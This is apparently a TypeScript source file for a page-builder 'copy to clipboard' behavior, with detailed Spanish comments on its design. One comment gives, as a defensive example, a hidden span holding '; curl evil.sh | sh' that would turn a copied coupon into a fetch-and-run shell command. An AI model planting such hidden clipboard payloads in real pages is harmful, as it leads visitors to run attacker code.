import type { Behavior } from "../types";

// Delegado en document (un solo listener, como filter/lightbox) — sube del
// click hasta [data-ol-copy], nunca asume que e.target ES el botón.
//
// LA decisión de esta receta: el valor a copiar se LEE DEL DOM
// (getElementById + innerText) en cada click, JAMÁS del atributo. La
// alternativa (data-ol-copy="TACOS20", el texto literal en el atributo) se
// descartó a propósito: sin runtime el botón sería un cadáver Y el cupón no
// estaría en ninguna parte de la página — rompe content-intact por completo.
// Apuntando a un id, el peor caso sin JS es que el visitante seleccione el
// texto del <code> a mano: sigue siendo honesto. De paso evita escapar
// comillas dentro del atributo. Se lee en CADA click (nunca se cachea), así
// que si el creador edita el texto del <code> tras montar, el próximo click
// copia el valor nuevo.
//
// innerText, NO textContent (fix del Arreglo 5 de la revisión final):
// "lo que copias es lo que ves" es la promesa de `degradation:
// "content-intact"` de más abajo, y textContent la rompía — incluye texto de
// descendientes con display:none, invisibles/inaccesibles para el visitante.
// Prueba: un <span style="display:none">; curl evil.sh | sh</span> dentro del
// target hacía que el visitante viera "TACOS20" pero el portapapeles
// recibiera "TACOS20; curl evil.sh | sh". innerText SÍ respeta el render (es
// justo lo que lo distingue de textContent) y excluye lo oculto.
// `??`, no `||`: un elemento cuyo ÚNICO contenido está oculto tiene
// innerText === "" LEGÍTIMAMENTE — `||` caería a textContent (el bug que
// esto arregla) en ese caso; `??` solo cae cuando el valor es null/undefined.
// GOTCHA REAL: jsdom (25.0.1, la versión de este repo) NO implementa
// innerText — el getter simplemente no existe, así que `s.innerText` da
// `undefined` y el fallback `??s.textContent` es lo que mantiene verdes los
// tests de este archivo (mount() corre sobre jsdom). En un navegador real
// gana innerText siempre. Como jsdom no puede probar la exclusión de texto
// oculto, esa aserción vive en el único sitio que SÍ puede probarla de
// verdad: scripts/qa/behaviors-born100-gate.mjs (Puppeteer, Chrome real).
//
// `d=document` se alía DENTRO del closure del click (no en el scope
// compartido de la IIFE compuesta) — mismo patrón que lightbox.ts: cero
// riesgo de colisión con otras recetas, y ahorra bytes en las 4 llamadas que
// siguen (getElementById/createElement/body/execCommand).
//
// El fallback (textarea temporal + execCommand('copy')) existe porque la
// Clipboard API puede no existir o estar bloqueada — el iframe del preview
// del editor es un caso real, no hipotético. `t.select()` exige el elemento
// EN el DOM; position:fixed+opacity:0 (nunca display:none, que impediría
// seleccionar el texto) lo saca del flujo y lo hace invisible sin flash ni
// salto de layout. try/catch alrededor de execCommand: es una API legacy que
// no todos los entornos implementan (ni siquiera la definen como función) —
// sin el guard, una excepción ahí se comería el t.remove() de abajo y
// dejaría el textarea temporal como basura en el DOM para siempre.
// `cl&&cl.writeText` cubre TANTO navigator.clipboard inexistente COMO
// writeText ausente; si existe pero la promesa rechaza (permiso denegado,
// contexto no seguro), .then(k,f) cae al mismo fallback.
//
// k() (swap+restore) es un no-op si el autor no puso data-ol-copied — nada
// que sustituir, nada que temporizar. TAMBIÉN es un no-op si el botón YA
// muestra el texto de confirmación: sin ese segundo guard, un doble click
// rompe la promesa de "o" (la variable que se restaura al final) — el 2º
// click lee b.textContent DESPUÉS de que el 1er click ya lo cambió, así que
// captura "¡Copiado!" creyendo que es el texto original, y su timer (que
// dispara 2s más tarde) pisa al del 1er click con ese valor incorrecto,
// dejando el botón atascado en el texto de confirmación para siempre. El
// guard compara b.textContent (no un id ni un flag global), así que dos
// botones de copy distintos en la misma página nunca se pisan entre sí.
const JS = `document.addEventListener('click',function(e){if(olEditing())return;var b=e.target.closest('[data-ol-copy]');if(!b)return;var d=document;var s=d.getElementById(b.getAttribute('data-ol-copy'));if(!s)return;var v=s.innerText??s.textContent;function k(){var m=b.getAttribute('data-ol-copied');if(!m||b.textContent===m)return;var o=b.textContent;b.textContent=m;setTimeout(function(){b.textContent=o},2000)}function f(){var t=d.createElement('textarea');t.style.cssText='position:fixed;opacity:0';t.value=v;d.body.appendChild(t);t.select();try{d.execCommand('copy')}catch{}t.remove();k()}var cl=navigator.clipboard;cl&&cl.writeText?cl.writeText(v).then(k,f):f()});`;

export const copy: Behavior = {
  name: "copy",
  marker: "data-ol-copy",
  schema: {
    root: { kind: "idRef" },
  },
  js: JS,
  budgetBytes: 700,
  docBudgetChars: 1200,
  degradation: "content-intact",
  a11y: [{ selector: ":root", attr: "aria-label" }],
  doc: {
    label: "copiar al portapapeles",
    when: "Un cupón, código de descuento, número de cuenta o cualquier texto corto que el visitante necesita copiar exacto — sin errores de tipeo — para pegarlo en otro lugar (checkout, WhatsApp, una app bancaria).",
    whenNot: "No lo uses para copiar párrafos largos o contenido que el visitante debería leer ahí mismo: es para un valor corto que se pega en otro sitio. Y el botón necesita apuntar a un id que exista en la página — sin uno, no hay qué copiar.",
    example: `<code id="cupon-verano">TACOS20</code>
<button data-ol-copy="cupon-verano" data-ol-copied="¡Copiado!" aria-label="Copiar el cupón">Copiar</button>`,
  },
  status: "stable",
};
